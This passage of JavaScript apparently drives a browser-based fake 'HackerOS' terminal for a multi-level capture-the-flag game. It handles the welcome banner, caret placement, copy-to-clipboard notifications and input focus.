                    range.setStart(this.childNodes[0], this.textContent.length);
                } else {
                    range.setStart(this, 0);
                }
                range.collapse(true);
                sel.removeAllRanges();
                sel.addRange(range);
            }, 10);
        }
    });
}

// Función para mostrar notificación de copiado
function showCopyNotification() {
    copyNotification.style.display = 'block';
    setTimeout(() => {
        copyNotification.style.display = 'none';
    }, 2000);
}

// Inicializar
function init() {
    writeToTerminal('HackerOS 13.37-leet Multi-Level CTF Terminal (GNU/Linux 5.4.0-42-generic x86_64)');
    writeToTerminal('');
    writeToTerminal('🧠 Welcome to the Multi-Level CTF Challenge, hacker...');
    writeToTerminal('Last login: ' + new Date().toString().substring(0, 24) + ' from 192.168.1.337');
    writeToTerminal('System load: 1.337  Processes: 42  Users logged in: 1337');
    writeToTerminal('Memory usage: 13%   IP address: 127.0.0.1   Swap usage: 0%');
    writeToTerminal('');
    writeToTerminal(`<span class="success">🎯 Current Level: ${currentLevel} - CTF de Navegación y Exploración</span>`);
    writeToTerminal('<span class="easter-egg">💡 Tip: Try "help" for commands, "level 2" to access the permissions challenge...</span>');
    writeToTerminal('');

    currentInputElement = createInputLine();
    setupInputHandlers();

    terminal.addEventListener('mouseup', function () {
        const selection = window.getSelection();
        if (selection.toString().length > 0) {
            document.execCommand('copy');
            showCopyNotification();
        }
    });

    document.addEventListener('keydown', function (e) {
        if (e.ctrlKey && e.key === 'c') {
            const selection = window.getSelection();
            if (selection.toString().length > 0) {
                document.execCommand('copy');
                showCopyNotification();
                e.preventDefault();
            }
        }
    });
}

// Mantener foco en el terminal
document.addEventListener('click', function () {
    if (currentInputElement) {
        currentInputElement.focus();
    }
});

// Inicializar cuando la página carga
window.addEventListener('load', init);
